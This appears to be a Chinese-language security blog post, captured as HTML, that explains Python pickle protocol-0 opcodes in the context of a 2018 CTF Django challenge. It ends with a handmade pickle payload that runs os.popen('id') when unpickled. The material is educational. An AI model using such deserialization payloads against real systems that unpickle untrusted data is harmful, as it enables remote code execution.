@@ -1,0 +1,438 @@
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <title>Jhe&#39;s blog - Python Pickle </title>
+    
+    
+    <meta content="Python, Pickle, security" name="keywords">
+    
+    <meta content="Jhe&#39;s blog - 在 2018 年的時候有一個 Code-breaking Puzzles 挑戰賽，都是 Web 題，使用的語言橫跨 PHP、Nodejs、Java 與 python，用盡各語言的特性及奇技淫巧來解題
+唯一的一題用 Django 出的題目引起了我的興趣，起初環境不知道為什麼架不起來，後來雖然有了 Dockerfile 還是不看太清楚有什麼問題，看了一下設定檔可以猜出大概是反序列化問題，詳細的 write-up 可以在這邊看到
+總體來說先用 SSTI 洩漏 sign cookie 用的 SECRET key，再利用 getattr 函數取出被黑名單的函數來執行就大功告成了，但重點是一般在寫反序列化用的 payload 時一次只能執行一個函數，文章後面介紹如何透過手刻 pickle 的方式來解決這個問題
+Pickle 從 pickle.py、pickletools.py 與官方的文件中可以看到相關說明，Pickle 是一種協定用來將物件序列化為字串，並且有不同版本(0~4)，為了向下相容每個版本的 opcode 意義都相同，只差在新版的協議有較多的 opcode，且 protocol 0 的 opcode 都是可見字元，這邊人工寫的部分主要用這個版本的協定，可以在 pickle.py 中看到這些 opcode
+Pickle 透過 stack 與 memo 來執行，其中 stack 用來呼叫函數與存放參數，而 memo 是一個字典(dict) 結構，用來存放運行中碰到過的物件
+看看從一般序列化物件後 opcode 是如何
+class A(object): def __reduce__(self): return (print, (0, )) 這邊需要注意在 dumps 的時候需要指定 protocol 為 0，否則會使用預設的 protocol 版本" name="description">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    
+    
+
+    
+
+    
+
+    
+
+    <link rel="stylesheet" href="/layui/css/layui.css">
+    <link rel="stylesheet" href="/self/css/default.css">
+    <script src="/layui/layui.js"></script>
+
+    <link rel="stylesheet" async href="/self/css/markdown.min.css">
+    <link rel="stylesheet" async href="/self/css/gallery.css">
+    
+    
+    
+
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous">
+    <script async src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.0/lazysizes.min.js" integrity="sha256-h2tMEmhemR2IN4wbbdNjj9LaDIjzwk2hralQwfJmBOE=" crossorigin="anonymous"></script></head>
+
+<body>
+    
+    <header class="layui-header layui-bg-cyan">
+
+    
+    
+    <a class="nav-self-logo" href="/">
+        Jhe&#39;s blog
+    </a>
+
+    <ul class="layui-nav layui-layout-right layui-bg-cyan" lay-filter="">
+        
+        
+        <li class="layui-nav-item" id="nav_big"><a href="/post/">Posts</a></li>
+        
+
+        
+
+        
+        <li class="layui-nav-item" id="nav_small">
+            <a href="javascript:;">
+                <i class="layui-icon layui-icon-app" style="font-size: 24px;"></i>
+            </a>
+
+            <dl class="layui-nav-child">
+                
+                <dd><a href="/post/">Posts</a></dd>
+                
+
+                
+            </dl>
+        </li>
+    </ul>
+</header>
+
+<script>
+layui.use('element', function(){
+  var element = layui.element;
+});
+</script>
+        <div id="content" style="min-height:80%">
+<div class="layui-container" style="margin-bottom: 10px">
+    
+
+    <div class="layui-row layui-col-space10">
+        <div class="layui-col-md8 layui-col-sm12 layui-col-xs12">
+            <div class="layui-card single-card">
+                <br />
+                <blockquote class="self-elem-quote  markdown-body single-title" >
+                    <h1>Python Pickle</h1>
+                    <h3 style="margin-top:10px; margin-bottom:10px"> 
+    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
+    <span>2019-05-30</span>
+
+    
+     
+    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
+    
+
+    
+        <a href="/categories/security/">
+            <span class="layui-badge " style="vertical-align: 2px;">security</span>
+        </a>
+    
+
+    
+    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
+    
+
+    
+        <a href="/tags/python/">
+            <span class="layui-badge " style="vertical-align: 2px;">Python</span>
+        </a>
+    
+        <a href="/tags/pickle/">
+            <span class="layui-badge " style="vertical-align: 2px;">Pickle</span>
+        </a>
+    
+    
+</h3>
+                </blockquote>
+                <div class="layui-card-body markdown-body single-content">
+                    <p>在 2018 年的時候有一個 Code-breaking Puzzles 挑戰賽，都是 Web 題，使用的語言橫跨 PHP、Nodejs、Java 與 python，用盡各語言的特性及奇技淫巧來解題</p>
+<p>唯一的一題用 Django 出的題目引起了我的興趣，起初環境不知道為什麼架不起來，後來雖然有了 Dockerfile 還是不看太清楚有什麼問題，看了一下設定檔可以猜出大概是反序列化問題，詳細的 write-up 可以在<a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">這邊</a>看到</p>
+<p>總體來說先用 SSTI 洩漏 sign cookie 用的 SECRET key，再利用 <code>getattr</code> 函數取出被黑名單的函數來執行就大功告成了，但重點是一般在寫反序列化用的 payload 時一次只能執行一個函數，文章後面介紹如何透過手刻 pickle 的方式來解決這個問題</p>
+<h4 id="pickle">Pickle</h4>
+<p>從 <code>pickle.py</code>、<code>pickletools.py</code> 與官方的文件中可以看到相關說明，Pickle 是一種協定用來將物件序列化為字串，並且有不同版本(0~4)，為了向下相容每個版本的 opcode 意義都相同，只差在新版的協議有較多的 opcode，且 protocol 0 的 opcode 都是可見字元，這邊人工寫的部分主要用這個版本的協定，可以在 <code>pickle.py</code> 中看到這些 opcode</p>
+<p><img src="/images/python_pickle/0.png" alt=""></p>
+<p>Pickle 透過 stack 與 memo 來執行，其中 stack 用來呼叫函數與存放參數，而 memo 是一個字典(dict) 結構，用來存放運行中碰到過的物件</p>
+<p>看看從一般序列化物件後 opcode 是如何</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">A</span>(object):
+    <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__reduce__</span>(self):
+        <span style="color:#66d9ef">return</span> (print, (<span style="color:#ae81ff">0</span>, ))
+</code></pre></div><p>這邊需要注意在 dumps 的時候需要指定 protocol 為 0，否則會使用預設的 protocol 版本</p>
+<pre tabindex="0"><code>&gt;&gt;&gt; pickle.dumps(A(), protocol=0)
+&gt;&gt;&gt; b'c__builtin__\nprint\np0\n(L0L\ntp1\nRp2\n.'
+</code></pre><p>可以清楚看到一些可見字元跟被呼叫的函數，使用 python 內建的 module 可以看得更清楚一點</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">pickletools<span style="color:#f92672">.</span>dis(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;c__builtin__</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">print</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">p0</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">(L0L</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">tp1</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Rp2</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">.&#39;</span>)
+    <span style="color:#ae81ff">0</span>: c    GLOBAL     <span style="color:#e6db74">&#39;__builtin__ print&#39;</span> <span style="color:#75715e"># 載入 __builtin__.print 函數</span>
+   <span style="color:#ae81ff">19</span>: p    PUT        <span style="color:#ae81ff">0</span>                   <span style="color:#75715e"># 把 stack 頂端的值放到 memo[0]</span>
+   <span style="color:#ae81ff">22</span>: (    MARK                           <span style="color:#75715e"># push 一個標記到 stack</span>
+   <span style="color:#ae81ff">23</span>: L        LONG       <span style="color:#ae81ff">0</span>               <span style="color:#75715e"># push 一個十進位數到 stack</span>
+   <span style="color:#ae81ff">27</span>: t        TUPLE      (MARK at <span style="color:#ae81ff">22</span>)    <span style="color:#75715e"># 把這個 opcode 與到之前標記的內容變成 tuple 再放進 stack</span>
+   <span style="color:#ae81ff">28</span>: p    PUT        <span style="color:#ae81ff">1</span>                   <span style="color:#75715e"># 把 stack 頂端的值放到 memo[1]</span>
+   <span style="color:#ae81ff">31</span>: R    REDUCE                         <span style="color:#75715e"># 呼叫使用 stack 上的參數與函數物件呼叫函數</span>
+   <span style="color:#ae81ff">32</span>: p    PUT        <span style="color:#ae81ff">2</span>                   <span style="color:#75715e"># 把 stack 頂端的值放到 memo[2]</span>
+   <span style="color:#ae81ff">35</span>: <span style="color:#f92672">.</span>    STOP                           <span style="color:#75715e"># 結束</span>
+highest protocol among opcodes <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
+</code></pre></div><p>其實這邊就算把 p 的部分都拿掉也是可以正常運作，畢竟放進去之後就再也沒有把結果拿出來用過</p>
+<p>想要連續呼叫函數的話只要依樣畫葫蘆即可</p>
+<h4 id="handmade">Handmade</h4>
+<p>如果我想要執行 <code>os.popen('id').read()</code> 可以嗎?</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">op <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;&#39;&#39;cbuiltins
+</span><span style="color:#e6db74">print
+</span><span style="color:#e6db74">(cbuiltins
+</span><span style="color:#e6db74">getattr
+</span><span style="color:#e6db74">(cos
+</span><span style="color:#e6db74">popen
+</span><span style="color:#e6db74">(S&#39;id&#39;
+</span><span style="color:#e6db74">tRS&#39;read&#39;
+</span><span style="color:#e6db74">tR(tRtR.
+</span><span style="color:#e6db74">&#39;&#39;&#39;</span>
+</code></pre></div><p>將上面的 pickle code 翻譯成 python code 的話長這樣</p>
+<p><code>getattr(os.popen('id'), 'read')()</code></p>
+<p>執行之後就可以看到 <code>id</code> 的結果了</p>
+<h3 id="conclusion">Conclusion</h3>
+<p>每當覺得某個語言的 trick 要窮盡之時，總會有意想不到的驚喜，資安果然是一條需要無盡學的道路</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a></li>
+</ul>
+</div>
+            </div>
+        </div>
+
+        <div class="layui-col-md4 layui-col-sm12 layui-col-xs12">
+            
+            <div class="layui-card single-card">
+                <h2 class="single-title">Relevant Topics</h2>
+                
+                	
+                    <div style="margin-left: 10px;">
+                        <blockquote class="self-elem-quote " style="background-color:#FFFFFF;margin-top: 10px;">
+                            <a href="/post/cve_2017_11610/">
+                                <h3 class="">CVE-2017-11610</h3>
+                            </a>
+                            
+                            <h3 style="margin-top:10px; margin-bottom:10px"> 
+    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
+    <span>2018-09-30</span>
+
+    
+     
+    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
+    
+
+    
+        <a href="/categories/security/">
+            <span class="layui-badge " style="vertical-align: 2px;">security</span>
+        </a>
+    
+
+    
+    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
+    
+
+    
+        <a href="/tags/cve/">
+            <span class="layui-badge " style="vertical-align: 2px;">CVE</span>
+        </a>
+    
+        <a href="/tags/python/">
+            <span class="layui-badge " style="vertical-align: 2px;">Python</span>
+        </a>
+    
+    
+</h3>
+                        </blockquote>
+                    </div>
+                	
+                
+                <br />
+            </div>
+            
+
+            <div class="layui-card single-card">
+                <h2 class="single-title">Recent Posts</h2>
+            
+                
+                <div style="margin-left: 10px;">
+                    <blockquote class="self-elem-quote " style="background-color:#FFFFFF;margin-top: 10px;">
+                    <a href="/post/breakdown_mips_binary_exploit_with_qdb/">
+                        <h3 class="">Breakdown MIPS binary exploit with Qdb</h3>
+                    </a>
+                    <h3 style="margin-top:10px; margin-bottom:10px"> 
+    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
+    <span>2021-02-01</span>
+
+    
+     
+    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
+    
+
+    
+        <a href="/categories/security/">
+            <span class="layui-badge " style="vertical-align: 2px;">security</span>
+        </a>
+    
+
+    
+    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
+    
+
+    
+        <a href="/tags/qiling/">
+            <span class="layui-badge " style="vertical-align: 2px;">Qiling</span>
+        </a>
+    
+        <a href="/tags/qdb/">
+            <span class="layui-badge " style="vertical-align: 2px;">Qdb</span>
+        </a>
+    
+        <a href="/tags/iot/">
+            <span class="layui-badge " style="vertical-align: 2px;">IoT</span>
+        </a>
+    
+    
+</h3>
+                    </blockquote>
+                </div>
+                
+                <div style="margin-left: 10px;">
+                    <blockquote class="self-elem-quote " style="background-color:#FFFFFF;margin-top: 10px;">
+                    <a href="/post/cve_2020_8962/">
+                        <h3 class="">How to reproduce CVE-2020-8962 with Qiling Framework</h3>
+                    </a>
+                    <h3 style="margin-top:10px; margin-bottom:10px"> 
+    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
+    <span>2020-07-30</span>
+
+    
+     
+    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
+    
+
+    
+        <a href="/categories/security/">
+            <span class="layui-badge " style="vertical-align: 2px;">security</span>
+        </a>
+    
+
+    
+    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
+    
+
+    
+        <a href="/tags/qiling/">
+            <span class="layui-badge " style="vertical-align: 2px;">Qiling</span>
+        </a>
+    
+        <a href="/tags/cve/">
+            <span class="layui-badge " style="vertical-align: 2px;">CVE</span>
+        </a>
+    
+        <a href="/tags/d-link/">
+            <span class="layui-badge " style="vertical-align: 2px;">D-Link</span>
+        </a>
+    
+    
+</h3>
+                    </blockquote>
+                </div>
+                
+                <div style="margin-left: 10px;">
+                    <blockquote class="self-elem-quote " style="background-color:#FFFFFF;margin-top: 10px;">
+                    <a href="/post/elf_symbol_resolving/">
+                        <h3 class="">ELF Symbol Resolving</h3>
+                    </a>
+                    <h3 style="margin-top:10px; margin-bottom:10px"> 
+    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
+    <span>2019-12-12</span>
+
+    
+     
+    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
+    
+
+    
+        <a href="/categories/security/">
+            <span class="layui-badge " style="vertical-align: 2px;">security</span>
+        </a>
+    
+
+    
+    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
+    
+
+    
+        <a href="/tags/elf/">
+            <span class="layui-badge " style="vertical-align: 2px;">ELF</span>
+        </a>
+    
+    
+</h3>
+                    </blockquote>
+                </div>
+                
+                <div style="margin-left: 10px;">
+                    <blockquote class="self-elem-quote " style="background-color:#FFFFFF;margin-top: 10px;">
+                    <a href="/post/python_pickle/">
+                        <h3 class="">Python Pickle</h3>
+                    </a>
+                    <h3 style="margin-top:10px; margin-bottom:10px"> 
+    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
+    <span>2019-05-30</span>
+
+    
+     
+    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
+    
+
+    
+        <a href="/categories/security/">
+            <span class="layui-badge " style="vertical-align: 2px;">security</span>
+        </a>
+    
+
+    
+    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
+    
+
+    
+        <a href="/tags/python/">
+            <span class="layui-badge " style="vertical-align: 2px;">Python</span>
+        </a>
+    
+        <a href="/tags/pickle/">
+            <span class="layui-badge " style="vertical-align: 2px;">Pickle</span>
+        </a>
+    
+    
+</h3>
+                    </blockquote>
+                </div>
+                
+                <div style="margin-left: 10px;">
+                    <blockquote class="self-elem-quote " style="background-color:#FFFFFF;margin-top: 10px;">
+                    <a href="/post/lazy_binding_in_elf/">
+                        <h3 class="">Lazy binding in ELF</h3>
+                    </a>
+                    <h3 style="margin-top:10px; margin-bottom:10px"> 
+    <i class="layui-icon layui-icon-date" style="font-size: 28px; vertical-align: -2px;"></i>
+    <span>2019-05-15</span>
+
+    
+     
+    <i class="layui-icon layui-icon-list" style="font-size: 32px; vertical-align: -3px;"></i>
+    
+
+    
+        <a href="/categories/security/">
+            <span class="layui-badge " style="vertical-align: 2px;">security</span>
+        </a>
+    
+
+    
+    <i class="layui-icon layui-icon-tabs" style="font-size: 22px; vertical-align: 1px;margin-right:2px;"></i>
+    
+
+    
+        <a href="/tags/elf/">
+            <span class="layui-badge " style="vertical-align: 2px;">ELF</span>
+        </a>
+    
+    
+</h3>
+                    </blockquote>
+                </div>
+                
+            
+            <br />
+            </div>
+        </div>
+
+    </div>
+</div>
+
+
+        </div><footer>
+    
+    
+    <div class="layui-container">
+        <p class="copyright">&copy; All rights reserved. Powered by <a href='https://gohugo.io' style='color:#FFFFFF'>Hugo</a> and <a href='https://github.com/ertuil/erblog' style='color:#FFFFFF'>Erblog</a>.</p>
+    </div>
+</footer>
+</body>
+</html>
